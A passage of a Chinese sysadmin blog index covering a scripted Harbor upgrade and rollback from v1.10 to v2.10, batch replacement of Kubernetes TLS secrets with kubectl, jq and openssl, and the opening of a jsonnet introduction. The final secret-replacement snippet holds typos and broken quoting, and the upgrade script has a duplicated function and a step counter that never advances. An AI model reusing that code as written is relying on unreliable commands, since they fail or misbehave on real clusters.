kubectl诊断命令"},{"content":"本文将介绍 Harbor 从 v1.10.7 升级到 v2.10.0，以及如何将 Harbor 从 v2.10 回滚到 v1.10.7。\n升级条件 Linux服务器 4 个 CPU 和 8 GB 内存（强要求），100G可用空间（跨多版本时存放备份文件以及镜像文件，这部分要求） Docker-compose \u0026gt; 1.19.0+ 备份现有的 Harbor /data/database 目录 本次升级主要是使用了 harbor 内置的数据库，所以升级步骤比较容易。\n官方升级路线 harbor 的升级，是不能跨很多版本进行升级，官方对此有详细说明 [1] ，可以看到路线为：\n1.10.0 [1] =\u0026gt; 2.4.0 [2] =\u0026gt; 2.6.0 [3] =\u0026gt; 2.8.0 [4] =\u0026gt; 2.10.0 [5]\n模拟升级步骤 github release 页下载对应的安装包\n解压\n# 命令主要为将harbor压缩包内文件解压到指定目录中，由于 harbor 解压后文件名无论版本如何都为“harbor” $ mkdir ./harbor-v1.10 \u0026amp;\u0026amp; tar -xf harbor-offline-installer-v1.10.0.tgz -C ./harbor-v1.10 --strip-components 1 备份默认的配置文件（仅限于 v1.10.x，v2.x均为 harbor.tmpl）\ncp harbor.yml harbor.yaml.backup 清除注释\ngrep -Ev '^#|^$|^\\s*(#|//)' harbor.yml.tmpl \u0026gt; harbor.yml.clean_annotation 修改一些默认配置\n\\cp -a harbor.yml.clean_annotation harbor.yml # 如果需要则关闭https sed -i '/https:/,+3s/.*/# \u0026amp;/' harbor.yml # 替换默认harbor郁闷 sed -i \u0026quot;s@hostname: reg.mydomain.com@hostname: img.test.com@g\u0026quot; harbor.yml # 修改默认目录 sed -i \u0026quot;s@data_volume: /data@data_volume: /data/harbor@g\u0026quot; harbor.yml 启动服务\n./install.sh 升级步骤 在升级前首先要缕清升级的内容，官方在升级时存在两个步骤，配置文件升级与数据库 schema 升级；并且需要知道升级的路线图，这里是从 1.10.0 升级至本文撰写时最新版本 2.10.0，所以查看官方升级路线为 1.10.0 =\u0026gt; 2.4.0 =\u0026gt; 2.6.0 =\u0026gt; 2.8.0 =\u0026gt; 2.10.0。总结升级所需变更如下：\nharbor的配置文件升级 数据库 schema 升级，由 harbor-core 组件自动完成 升级路线：1.10.0 =\u0026gt; 2.4.0 =\u0026gt; 2.6.0 =\u0026gt; 2.8.0 =\u0026gt; 2.10.0 备份当前 harbor 版本 备份当前版本是为了如果需要回滚的话，可以快速的回滚到所需的版本\ncd harbor docker-compose down 备份 Harbor 的当前文件，以便您可以在必要时回滚到当前版本。\n备份数据库文件 我们知道了，升级主要是对数据库 schema 进行reschema，Harbor 的每次新版本发布时新的功能及对老功能、代码的重构都会导致数据库模型的变更，因此几乎每次升级都需要升级数据库模式。配置文件数据，是指 Harbor 组件的配置文件，在部分新功能或者新的组件出现时，都需要在配置文件中新增其参数；在老功能、组件重构或者废弃时，也会对配置文件进行更新。\ncp -r /data/database /my_backup_dir/ reschema的工作是由 harbor-core 完成的，所以我们只需要备份即可，当新版本在启动时，第一次会 reschema，这个步骤的时间会随着 harbor 的使用量而增加，这里数据库目录为 13G，1.10.7 =\u0026gt; 2.4.0 时间大概在20分钟左右。\nharbor的配置文件升级 harbor 配置的升级是需要手动执行的，命令是包含在 offline 安装包中，被包含在 “goharbor/prepare:v2.x.0” 镜像中。用户可以在 Harbor 的离线安装包中找到它，也可以在 Docker Hub 上获取，官方给出升级指南中的命令如下\n# 1.10 docker run -it --rm -v ./harbor.yml:/harbor-migration/harbor-cfg/harbor.yml goharbor/harbor-migrator:v1.10.0 --cfg up # 2.4 # 后的yaml文件必须是旧版本的 # 这步骤是将旧的 harbor.yaml 配置文件升级到新版本 # 升级后旧版本的配置文件就没有了，如果需要需要自行备份 # docker run -it --rm -v /:/hostfs goharbor/prepare:[tag] migrate -i ${path to harbor.yml} docker run -it --rm -v /:/hostfs goharbor/prepare:v2.4.0 migrate -i ./harbor.yml “-v /:/hostfs” 是将主机的根目录 “/” 挂载到容器中的 “/hostfs” 目录中。因为命令是运行在容器中的，而文件是在宿主机上的，为了能在容器中访问到指定的文件，需要这样挂载，之后 prepare 会对 “/hostfs” 这个文件做特殊处理，使得在容器里也能访问主机上的指定文件。\n”-i“ 是指定旧版本的 harbor 配置文件\nmigrate 命令有如下3个参数。\n​\t\u0026ndash;input（缩写形式为“-i”）：是输入文件的绝对路径，也就是需要升级的原配置文件。\n​\t\u0026ndash;output（缩写形式为“-o”）：是输出文件的绝对路径，也是升级后的配置文件，是可选参数，如果取默认值，则升级后的文件会被写回输入文件中。\n​\t\u0026ndash;target（缩写形式为“-t”）：是目标版本，也就是打算升级到的版本，也是可选参数，如果取默认值，则版本为此工具发布时所支持的最新版本。\n这里我们可以使用如下命令\ndocker run -v :/hostfs goharbor/prepare:v2.4.0 migrate -i home/harbor/upgrade/harbor.yml 升级成功会有如下输出\nmigrating to version 2.0.0 migrating to version 2.1.0 migrating to version 2.2.0 migrating to version 2.3.0 migrating to version 2.4.0 Written new values to home/harbor/upgrade/harbor.yml 启动新服务 在新版本 harbor 目录中，运行 ./install.sh 脚本来安装新的 Harbor 实例，这里会导入离线安装包，生成配置文件，启动服务等操作\n替换 docker-compose 文件 docker-compose 的生成是在 prepare 脚本中执行的，可以看出，是调用的 prepare 镜像\n# Run prepare script docker run --rm -v $input_dir:/input \\ -v $data_path:/data \\ -v $harbor_prepare_path:/compose_location \\ -v $config_dir:/config \\ -v /:/hostfs \\ --privileged \\ goharbor/prepare:dev prepare $@ 这种情况下，如果我们需要自定义的 docker-compose.yaml 就可以挂在到对应目录即可，模板文件可以在 photon/prepare/templates/docker_compose 处下载进行替换。\n替换后，使用 sed 命令，替换 prepare 脚本中的启动命令即可。\nsed -i \u0026quot;/-v \\/:\\/hostfs/a \\\\\\t\\\\t -v /root/docker_compose/docker-compose.yml.jinjia.${version}:/usr/src/app/templates/docker_compose/dockercompose.yml.jinjia \\\\\\\\\u0026quot; ./prepare 批量升级脚本 #!/bin/bash # 根据当前版本和目标版本选择对应的下载地址 declare -A harbor_versions=( [\u0026quot;v1.10.0\u0026quot;]=\u0026quot;https://github.com/goharbor/harbor/releases/download/v1.10.0/harbor-offline-installer-v1.10.0.tgz\u0026quot; [\u0026quot;v2.4.0\u0026quot;]=\u0026quot;https://github.com/goharbor/harbor/releases/download/v2.4.0/harbor-offline-installer-v2.4.0.tgz\u0026quot; [\u0026quot;v2.6.1\u0026quot;]=\u0026quot;https://github.com/goharbor/harbor/releases/download/v2.6.1/harbor-offline-installer-v2.6.1.tgz\u0026quot; [\u0026quot;v2.8.0\u0026quot;]=\u0026quot;https://github.com/goharbor/harbor/releases/download/v2.8.0/harbor-offline-installer-v2.8.0.tgz\u0026quot; [\u0026quot;v2.10.0\u0026quot;]=\u0026quot;https://github.com/goharbor/harbor/releases/download/v2.10.0/harbor-offline-installer-v2.10.0.tgz\u0026quot; ) # # Set Colors # bold=$(tput bold) underline=$(tput sgr 0 1) reset=$(tput sgr0) red=$(tput setaf 1) green=$(tput setaf 76) white=$(tput setaf 7) tan=$(tput setaf 202) blue=$(tput setaf 25) # # Headers and Logging # underline() { printf \u0026quot;${underline}${bold}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } h1() { printf \u0026quot;\\n${underline}${bold}${blue}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } h2() { printf \u0026quot;\\n${underline}${bold}${white}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } debug() { printf \u0026quot;${white}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } info() { printf \u0026quot;${white}➜ %s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } success() { printf \u0026quot;${green}✔ %s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } error() { printf \u0026quot;${red}✖ %s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } warn() { printf \u0026quot;${tan}➜ %s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } bold() { printf \u0026quot;${bold}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } note() { printf \u0026quot;\\n${underline}${bold}${blue}Note:${reset} ${blue}%s${reset}\\n\u0026quot; \u0026quot;$@\u0026quot; } set -e # 设置根目录和工作目录 ROOT_DIR=$(cd $(dirname $0); pwd) export ROOT_DIR # 设置步骤变量 usage() { cat \u0026lt;\u0026lt;EOF Usage: ${CMD} [ OPTION ] Commands: Some commands take arguments or -h for usage. -d download harbor rolling dependencies offline installer package -u upgrade harbor to latest -r rollback to old version -h this message EOF return 0 } compare_versions() { local current_version=$1 local target_version=$2 if [[ $current_version == v* ]]; then current_version=${current_version#v} fi if [[ $target_version == v* ]]; then target_version=${target_version#v} fi if [[ $current_version == \u0026quot;$target_version\u0026quot; ]]; then return 2 fi IFS='.' read -ra current_version_parts \u0026lt;\u0026lt;\u0026lt; \u0026quot;$current_version\u0026quot; IFS='.' read -ra target_version_parts \u0026lt;\u0026lt;\u0026lt; \u0026quot;$target_version\u0026quot; for (( i=0; i\u0026lt;${#current_version_parts[@]}; i++ )); do if (( ${target_version_parts[$i]} \u0026gt; ${current_version_parts[$i]} )); then return 0 elif (( ${target_version_parts[$i]} \u0026lt; ${current_version_parts[$i]} )); then return 1 fi done return 2 } set_env() { # 设置工作目录 WORK_DIR=\u0026quot;${ROOT_DIR}/_work\u0026quot; # 获取当前版本和目标版本 read -p \u0026quot;Please input current version [1.10.0]: \u0026quot; CURRENT_VERSION CURRENT_VERSION=${CURRENT_VERSION:-v1.10.0} if [[ ${CURRENT_VERSION:0:1} != \u0026quot;v\u0026quot; ]]; then CURRENT_VERSION=\u0026quot;v${CURRENT_VERSION}\u0026quot; fi read -p \u0026quot;Please input target version [2.10.0]: \u0026quot; TARGET_VERSION TARGET_VERSION=${TARGET_VERSION:-v2.10.0} if [[ ${TARGET_VERSION:0:1} != \u0026quot;v\u0026quot; ]]; then TARGET_VERSION=\u0026quot;v${TARGET_VERSION}\u0026quot; fi read -p \u0026quot;Please input harbor path [/root/harbor-v1.10]: \u0026quot; CURR_HARBOR_PATH CURR_HARBOR_PATH=${CURR_HARBOR_PATH:-/root/harbor-v1.10} read -p \u0026quot;Please input harbor database [/data/harbor]: \u0026quot; DATA_DIR DATA_DIR=${DATA_DIR:-/data/harbor} # 设置备份目录 BACKUP_DIR=\u0026quot;${ROOT_DIR}/harbor_backup\u0026quot; # 当前版本的备份路径 CURRENT_VERSION_BACKUP_PATH=\u0026quot;$BACKUP_DIR/${CURRENT_VERSION}\u0026quot; export WORK_DIR CURRENT_VERSION TARGET_VERSION CURR_HARBOR_PATH DATA_DIR BACKUP_DIR CURRENT_VERSION_BACKUP_PATH versions=\u0026quot;\u0026quot; sorted_versions=\u0026quot;\u0026quot; export versions sorted_versions } set_env_rollback() { # 设置工作目录 WORK_DIR=\u0026quot;${ROOT_DIR}/_work\u0026quot; # 获取当前版本和目标版本 read -p \u0026quot;Please input current version [2.10.0]: \u0026quot; CURRENT_VERSION CURRENT_VERSION=${CURRENT_VERSION:-v2.10.0} if [[ ${CURRENT_VERSION:0:1} != \u0026quot;v\u0026quot; ]]; then CURRENT_VERSION=\u0026quot;v${CURRENT_VERSION}\u0026quot; fi read -p \u0026quot;Please input target version [1.10.0]: \u0026quot; TARGET_VERSION TARGET_VERSION=${TARGET_VERSION:-v1.10.0} if [[ ${TARGET_VERSION:0:1} != \u0026quot;v\u0026quot; ]]; then TARGET_VERSION=\u0026quot;v${TARGET_VERSION}\u0026quot; fi read -p \u0026quot;Please input old harbor dirname [harbor-v1.10.0]: \u0026quot; CURR_HARBOR_PATH CURR_HARBOR_PATH=${CURR_HARBOR_PATH:-harbor-v1.10.0} read -p \u0026quot;Please input harbor database [/data/harbor]: \u0026quot; DATA_DIR DATA_DIR=${DATA_DIR:-/data/harbor} # 设置备份目录 BACKUP_DIR=\u0026quot;${ROOT_DIR}/harbor_rollback_backup\u0026quot; # 当前版本的备份路径 CURRENT_VERSION_BACKUP_PATH=\u0026quot;$BACKUP_DIR/${CURRENT_VERSION}\u0026quot; export WORK_DIR CURRENT_VERSION TARGET_VERSION CURR_HARBOR_PATH DATA_DIR BACKUP_DIR CURRENT_VERSION_BACKUP_PATH } initialize_workspace() { # 创建工作目录（如果不存在） [ -d ${WORK_DIR} ] || mkdir -pv ${WORK_DIR} # 创建备份目录（如果不存在） [ -d ${BACKUP_DIR} ] || mkdir -pv ${BACKUP_DIR} } clean_annotation() { find ${WORK_DIR}/${version}/ \\ -name \u0026quot;harbor.yml.*\u0026quot; \\ ! -name \u0026quot;harbor.yml.clean_annotation\u0026quot; \\ ! -name \u0026quot;harbor.yml.tmpl\u0026quot; -type f -exec \\ grep -Ev '^#|^$|^\\s*(#|//)' {} + \u0026gt; ${WORK_DIR}/${version}/harbor.yml.clean_annotation } replace_configuration() { cp -a ${WORK_DIR}/${version}/harbor.yml.clean_annotation ${WORK_DIR}/${version}/harbor.yml sed -i \u0026quot;s@hostname: reg.mydomain.com@hostname: your-harbor-domain.com@g\u0026quot; ${WORK_DIR}/${version}/harbor.yml sed -i \u0026quot;s@data_volume: /data@data_volume: ${DATA_DIR}@g\u0026quot; harbor.yml } compare_versions() { local current_version=$1 local target_version=$2 if [[ $current_version == v* ]]; then current_version=${current_version#v} fi if [[ $target_version == v* ]]; then target_version=${target_version#v} fi if [[ $current_version == $target_version ]]; then return 2 fi IFS='.' read -ra current_version_parts \u0026lt;\u0026lt;\u0026lt; \u0026quot;$current_version\u0026quot; IFS='.' read -ra target_version_parts \u0026lt;\u0026lt;\u0026lt; \u0026quot;$target_version\u0026quot; for (( i=0; i\u0026lt;${#current_version_parts[@]}; i++ )); do if (( ${target_version_parts[$i]} \u0026gt; ${current_version_parts[$i]} )); then return 0 elif (( ${target_version_parts[$i]} \u0026lt; ${current_version_parts[$i]} )); then return 1 fi done return 2 } check_version_number() { set +e # 校验版本号 compare_versions \u0026quot;$version\u0026quot; \u0026quot;${CURRENT_VERSION}\u0026quot; if [ $? -eq 0 ]; then warn \u0026quot;${CURRENT_VERSION} Greater than ${version}.\u0026quot; continue fi compare_versions \u0026quot;$version\u0026quot; \u0026quot;$CURRENT_VERSION\u0026quot; if [ $? -eq 2 ]; then warn \u0026quot;${TARGET_VERSION} equal ${version}.\u0026quot; continue fi set -e } swtich_version() { CURRENT_VERSION=${version:-$CURRENT_VERSION} # 当前版本的备份路径 CURRENT_VERSION_BACKUP_PATH=\u0026quot;${BACKUP_DIR}/${CURRENT_VERSION}\u0026quot; # 当前harbor的启动路径 CURR_HARBOR_PATH=\u0026quot;${WORK_DIR}/${CURRENT_VERSION}\u0026quot; export CURRENT_VERSION CURRENT_VERSION_BACKUP_PATH CURR_HARBOR_PATH } pause() { success \u0026quot;Press enter to continue...\u0026quot; read -r } sorted_version() { # 获取harbor版本列表 versions=(\u0026quot;${!harbor_versions[@]}\u0026quot;) # 对版本列表进行排序 sorted_versions=($(printf '%s\\n' \u0026quot;${versions[@]}\u0026quot; | sort -V)) export versions sorted_versions } initial_backup_dir() { h2 \u0026quot;[Backup initialization]: Starting backup ${CURRENT_VERSION} ...\u0026quot; # 创建备份目录（如果不存在） [ -d ${CURRENT_VERSION_BACKUP_PATH} ] || mkdir -pv ${CURRENT_VERSION_BACKUP_PATH} [ -d ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_database\u0026quot; ] || mkdir -pv ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_database\u0026quot; [ -d ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_redis\u0026quot; ] || mkdir -pv ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_redis\u0026quot; note \u0026quot;backup dir is: ${CURRENT_VERSION_BACKUP_PATH} is checked.\u0026quot; note \u0026quot;backup database dir ${CURRENT_VERSION_BACKUP_PATH}_database is checked.\u0026quot; } backup_current_version() { h2 \u0026quot;[Backup progess]: starting backup harbor ${CURRENT_VERSION} ...\u0026quot; # 备份harbor cp -r ${CURR_HARBOR_PATH} ${CURRENT_VERSION_BACKUP_PATH}/ # 备份harbor数据目录的database cp -Rpf ${DATA_DIR}/database ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_database\u0026quot; cp -Rpf ${DATA_DIR}/redis ${CURRENT_VERSION_BACKUP_PATH}\u0026quot;_redis\u0026quot; # 备份 harbor.yml 防止升级被覆盖从而无法回滚 cp ${CURR_HARBOR_PATH}/harbor.yml ${CURRENT_VERSION_BACKUP_PATH}/harbor.yml.$(date +%F) note \u0026quot;harbor ${CURRENT_VERSION} is backup completed, in ${CURRENT_VERSION_BACKUP_PATH}\u0026quot; } stop_old_harbor_progress() { # 停止旧版容器组 h2 \u0026quot;[Progress stop]: stopping ${CURRENT_VERSION} ...\u0026quot; cd ${CURR_HARBOR_PATH} \u0026amp;\u0026amp; docker-compose down \u0026amp;\u0026amp; cd ${ROOT_DIR} \u0026amp;\u0026amp; note \u0026quot;harbor ${CURRENT_VERSION} is stopped ...\u0026quot; } upgrade_configfile() { h2 \u0026quot;[Upgrade]: upgrade ${CURRENT_VERSION} to ${version} ...\u0026quot; docker run -v /:/hostfs goharbor/prepare:${version} migrate -i ${CURRENT_VERSION_BACKUP_PATH}/harbor.yml.$(date +%F) -o ${WORK_DIR}/${version}/harbor.yml note \u0026quot;harbor config version is ${version}\u0026quot; } rollback() { step=0 h2 \u0026quot;[Step $step]: set up rollback env ...\u0026quot;; let step+=1 set_env_rollback # 停止容器 h2 \u0026quot;[Progress stop]: stopping ${CURRENT_VERSION} ...\u0026quot; cd ${WORK_DIR}/${CURRENT_VERSION}/ \u0026amp;\u0026amp; docker-compose down \u0026amp;\u0026amp; cd ${ROOT_DIR} \u0026amp;\u0026amp; note \u0026quot;harbor ${CURRENT_VERSION} is stopped ...\u0026quot; # 备份当前版本 initial_backup_dir backup_current_version FILE_NAME=${WORK_DIR}/${CURRENT_VERSION} # 检查工作目录是否存在已下载文件 if [ ! -d ${FILE_NAME} ]; then error \u0026quot;${CURRENT_VERSION} not found\u0026quot; exit 1 fi h2 \u0026quot;[Step $step]: starting switch harbor ${TARGET_VERSION} ...\u0026quot; ; let step+=1 rm -fr ${DATA_DIR}/database \u0026amp;\u0026amp; rm -fr ${DATA_DIR}/redis \u0026amp;\u0026amp; \\ cp -Rpf \u0026quot;${ROOT_DIR}/harbor_backup/${TARGET_VERSION}_database/database\u0026quot; ${DATA_DIR}/database cp -Rpf \u0026quot;${ROOT_DIR}/harbor_backup/${TARGET_VERSION}_redis/redis\u0026quot; ${DATA_DIR}/redis note \u0026quot;Switch database to ${TARGET_VERSION} is completed.\u0026quot; sleep $((RANDOM % 6 + 10)) h2 \u0026quot;[Step $step]: starting harbor ${TARGET_VERSION} ...\u0026quot; cd \u0026quot;${ROOT_DIR}/harbor_backup/${TARGET_VERSION}/${CURR_HARBOR_PATH}\u0026quot; \u0026amp;\u0026amp; ./install.sh success $\u0026quot;----Harbor ${CURRENT_VERSION} to ${TARGET_VERSION} has been rollback.----\u0026quot; } download() { sorted_version # 更新harbor for version in \u0026quot;${sorted_versions[@]}\u0026quot;; do DOWNLOAD_URL=${harbor_versions[$version]} FILE_NAME=$(basename $DOWNLOAD_URL) FOLDER_NAME=${FILE_NAME%.*} ARCHIVE_FILE=\u0026quot;${ROOT_DIR}/$FILE_NAME\u0026quot; if [ -f ${ARCHIVE_FILE} ]; then warn \u0026quot;${FILE_NAME} existed, skip download..\u0026quot; continue fi note \u0026quot;[Downloader]: ${harbor_versions[$version]}\u0026quot; wget \u0026quot;${harbor_versions[$version]}\u0026quot; done } rotate_upgrade_harbor_versions() { # 获取harbor版本列表 sorted_version # 更新harbor for version in \u0026quot;${sorted_versions[@]}\u0026quot;; do # 向下传递变量 export version h2 \u0026quot;[Install ${version}]: starting upgrade ...\u0026quot; # 检查更新是否合法 # 如果当前版本等于要更新的版本，则不更新 check_version_number # 停止旧版本的服务 stop_old_harbor_progress # 备份当前版本 harbor initial_backup_dir backup_current_version h2 \u0026quot;[install checking]: Starting install checking ...\u0026quot; # 检查offline安装包是否下载 DOWNLOAD_URL=${harbor_versions[$version]} FILE_NAME=$(basename $DOWNLOAD_URL) FOLDER_NAME=${FILE_NAME%.*} ARCHIVE_FILE=\u0026quot;${ROOT_DIR}/$FILE_NAME\u0026quot; # 检查工作目录是否存在已下载文件 if [ ! -f ${ARCHIVE_FILE} ]; then error \u0026quot;Offline installer ${FILE_NAME} not found，Please download first ${DOWNLOAD_URL}\u0026quot; exit 1 fi # 创建对应版本的工作目录（如果不存在） [ -d \u0026quot;${WORK_DIR}\u0026quot;/\u0026quot;${version}\u0026quot; ] || mkdir -pv \u0026quot;${WORK_DIR}\u0026quot;/\u0026quot;${version}\u0026quot; note \u0026quot;install checked\u0026quot; h2 \u0026quot;[Uncompress]: starting uncompress harbor offline installer ...\u0026quot; # 解压对应版本安装包 mkdir -pv \u0026quot;${WORK_DIR}\u0026quot;/\u0026quot;${version}\u0026quot; \u0026amp;\u0026amp; tar -xf \u0026quot;${ROOT_DIR}\u0026quot;/\u0026quot;${FILE_NAME}\u0026quot; -C \u0026quot;${WORK_DIR}\u0026quot;/\u0026quot;${version}\u0026quot;/ --strip-components 1 note \u0026quot;harbor ${version}: ${WORK_DIR}/${version}\u0026quot; # 导入镜像 set +e h2 \u0026quot;[Load image]: starting load harbor ${version} ...\u0026quot; cd \u0026quot;${WORK_DIR}/${version}\u0026quot; \u0026amp;\u0026amp; docker image load -i harbor.\u0026quot;${version}\u0026quot;.tar.gz note \u0026quot;harbor image loaded\u0026quot; set -e h2 \u0026quot;[Replace configration]: start replace default config file ...\u0026quot; # 清除 harbor.yml 中的注释 clean_annotation # 替换为所需的config replace_configuration note \u0026quot;replaced\u0026quot; # 更新操作 upgrade_configfile h2 \u0026quot;[Installer]: start install harbor ${version} ...\u0026quot; # 如果使用了定制化 docker-compose 则开启这行 # 使用准备好的模板来更换容器内部的模板 # 这样保证了可以随意定制 docker-compose的文件 cd \u0026quot;${WORK_DIR}/${version}\u0026quot; \u0026amp;\u0026amp; sed -i \u0026quot;/-v \\/:\\/hostfs/a \\\\\\t\\\\t -v /root/docker_compose/docker-compose.yml.jinjia.${version}:/usr/src/app/templates/docker_compose/dockercompose.yml.jinjia \\\\\\\\\u0026quot; ./prepare cd \u0026quot;${WORK_DIR}/${version}\u0026quot; \u0026amp;\u0026amp; ./install.sh note \u0026quot;${version} installed\u0026quot; success $\u0026quot;----Harbor ${CURRENT_VERSION} to ${version} has been upgraded.----\u0026quot; # 切换变量，把这次更新好的版本作为下次要更新的旧版本进行传递 swtich_version pause done # 完成升级 success $\u0026quot;----Harbor ${TARGET_VERSION} has been installed and started successfully.----\u0026quot; } upgrade() { step=0 h2 \u0026quot;[Step $step]: set up env ...\u0026quot;; (( step+1 )) set_env # 初始化目录 h2 \u0026quot;[Step $step]: initailizaion workspace ...\u0026quot;; (( step+1 )) initialize_workspace # 滚动版本更新harbor h2 \u0026quot;[Step $step]: Starting upgrade gradually ...\u0026quot;; (( step+1 )) rotate_upgrade_harbor_versions } MAIN(){ if [ $# -eq 0 ]; then warn \u0026quot;Non option ...\u0026quot; usage exit 1 fi while getopts \u0026quot;duhr\u0026quot; option; do case ${option} in d) download R=$? ;; u) upgrade R=$? ;; r) rollback R=$? ;; h) usage R=$? ;; \\?) usage ;; esac done exit ${R} } MAIN ${@} Reference [1] Upgrade Harbor and Migrate Data - v1.10.0\n[2] Upgrade Harbor and Migrate Data - v2.4.0\n[3] Upgrade Harbor and Migrate Data - v2.6.0\n[4] Upgrade Harbor and Migrate Data - v2.8.0\n[5] Upgrade Harbor and Migrate Data - v2.10.0\n[6] Prepare 脚本\n[6] 生产系统中升级 Harbor 的完整流程\n[6] Upgrade Harbor from v1.10.7 to v2.4.0 then 2.6.0\n","permalink":"https://www.oomkill.com/2024/03/upgrade-harbor/","summary":"","title":"批量更新harbor版本 1.10 to 2.10"},{"content":"tls 证书在 k8s 集群上大量使用的话，当到期时会存在批量替换的难度，比如说每个名称空间，多个业务的使用，在这篇博文中，将尝试批量替换整个集群的证书（前提，在没有使用 vault, cert-manager这类组件的集群之上）。\n基本操作 步骤1：首先不知道有多少个名称空间使用了这个证书，所以需要遍历所有的名称空间，这里使用 kubectl 的 json path 实现\n$ kubectl get ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}' 步骤2：拿到名称空间的名字后，就需要循环这个名称空间下所有的 secret\nfor ns in `kubectl get ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'` do kubectl get secret -n $ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}' done 步骤3：找到与这个匹配的证书进行替换\n把步骤3拆解为下面几个步骤：\n拿去到符合要求的secret的名字 匹配名称是否为修改的secret 做替换操作 由于步骤2使用的是 jsonpath 拿到的 secret name，由于 kubectl 并不支持高级jsonpath语法，官方推荐使用jq，那么使用jq获取名字\nkubectl get secret -n $ns -o json|jq -r .items[].metadata.name 使用 awk 做字符串匹配，匹配是否包含对应的字符串关键词\nawk '$1 ~ /xxxx/ { print }' 最后使用 kubectl replace 替换现有的 secret\nkubectl create secret tls $secertName -n $ns --cert=xxx.crt --key=xxx.key --dry-run -o yaml| kubectl replace -f - 三个步骤整个为一个命令，如下所示：\nfor ns in `kubectl get ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{end}'` do for secertName in `kubectl get secret -n $ns -o json|jq -r .items[].metadata.name|awk '$1 ~ /xxxx/ { print }'; do kubectl create secret tls $secertName -n $ns --cert=xxx.crt --key=xxx.key --dry-run -o yaml| kubectl replace -f - done done 注意：\ningress 使用的证书会立即更新 如果是作为 secret 挂在到 Pod 中需要重启，这是因为 kubelet volume 机制导致的。 高级用法 查询证书内容，并根据域名进行替换\n查看证书域名的命令\nns=xxx secret_name=xxx keywords=xxx _command=xxxx openssl x509 -in \u0026lt;( ${_command} get secret -n $ns $secret_name -ojson | \\ jq --arg secret_key $( ${_command} get secret -n ${ns} ${secret_name} -ojson | \\ jq -r '.data | keys[]' | \\ awk -v keywords=${keywords} '$0 ~ keywords { print }' ) -r '.data | .[$secret_key]' | base64 -d ) -text -noout | \\ grep -i \u0026quot;subject: \u0026quot; 步骤拆解\n# 替换的名称空间 ns=kube-system # 替换的secret_name secret_name=test # 替换key的关键词，通常secret作为tls存在时，为xxx.crt keywords=crt # kubectl命令 _command=kubectl --kubeconfig=kubeconfig # shell语法，将一个命令的输出作为openssl的输入 openssl x509 -in \u0026lt;( ${_command} get secret -n $ns $secret_name -ojson | \\ # jq --arg secret_key 是 jq语法，将 $() 命名为secret_key作为变量传入到下个命令使用 jq --arg secret_key $( ${_command} get secret -n ${ns} ${secret_name} -ojson | \\ jq -r '.data | keys[]' | \\ # awk -v keywords=${keywords} 是awk语法，将keyworkd作为变量传递到awk内部 # '$0 ~ keywords { print }' 打印出符合条件的行 awk -v keywords=${keywords} '$0 ~ keywords { print }' ) -r '.data | .[$secret_key]' | base64 -d ) -text -noout | \\ grep -i \u0026quot;subject: \u0026quot; 更新前没出意外需要备份下对应资源，批量备份集群内指定域名的 secret 命令\n```bash # 指定域名的secret keywords=xxx _command=xxxx for ns in `${_command} get ns -o jsonpath='{range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{\u0026quot;end\u0026quot;}'` do for secret_name in `${_command} get secret -n $ns -o json|jq -r '.items[] | select( .type == \u0026quot;kubernetes.io/tls\u0026quot;) | .metadata.name'` do openssl x509 -in \u0026lt;( ${_command} get secret -n ${ns} ${secret_name} -ojson | \\ jq --arg secret_key $( ${_command} get secret -n ${ns} ${secret_name} -ojson | jq -r '.data | keys[]' | \\ awk '$0 ~ /crt/ { print }' ) -r '.data|.[$secret_key]'|base64 -d ) -text -noout | \\ grep -i \u0026quot;subject: \u0026quot;| \\ awk -v ns=${ns} -v secret_name=${secret_name} -v cmd=${_command} -v kw=${keywords} \\ '$0 ~ kw { system( cmd\u0026quot; get secret -n \u0026quot;ns\u0026quot; \u0026quot;secret_name\u0026quot; -oyaml \u0026gt; primetive/\u0026quot;ns\u0026quot;.\u0026quot;secret_name\u0026quot;.yaml\u0026quot; )}' done done 批量替换命令，查询 tls 签发域名，并进行替换\nkeywords=xxx _command=xxxx for ns in `${_command} get ns -o jsonpath='range $.items[*]}{.metadata.name}{\u0026quot;\\n\u0026quot;}{\u0026quot;end\u0026quot;}' do for secret_name in `${_command} get secret -n $ns -o json|jq -r '.items[] | select( .type == \u0026quot;kubernetes.io/tls\u0026quot;) | .metadta.name'` do openssl x509 -n \u0026lt;( ${_command} get secret -n ${ns} ${secret_name} -ojson | \\ jq --arg secret_key $(${_command} get secret -n ${ns} ${secret_name} -ojson | \\ jq -r '.data | .keys[]' | \\ awk '$0 ~ /crt/ { print }' -r '.data|.[$secret_key]'|base64 -d ) -text -noout | \\ grep -i \u0026quot;subject: \u0026quot;| \\ awk -v ns=${ns} -v secret_name=${secret_name} -v commond=${_command}\\ '$0 ~ ${keywords} { system( command\u0026quot; create secret tls -n \u0026quot;ns\u0026quot; \u0026quot;secret_name\u0026quot; --cert=ca.crt --key=key.key --dry-run -oyaml|command\u0026quot; replace -f -\u0026quot; )}' done done ","permalink":"https://www.oomkill.com/2024/02/kubernetes-update-secert/","summary":"","title":"Kubernetes维护 - secret批量更新"},{"content":"什么是jsonnet jsonnet是用于app或开发工具的数据模板语言，主要用于json的扩展，具有下面功能：\n生成配置数据 无副作用 组织化，简化，统一化 管理无序的配置 jsonnet可以通过面向对象消除重复。或者，使用函数。与现有/自定义应用程序集成。生成 JSON、YAML、INI 和其他格式。\n安装jsonnet Jsonnet 有两种实现（C++ 和 Go）\n在 Debian/Ubuntu 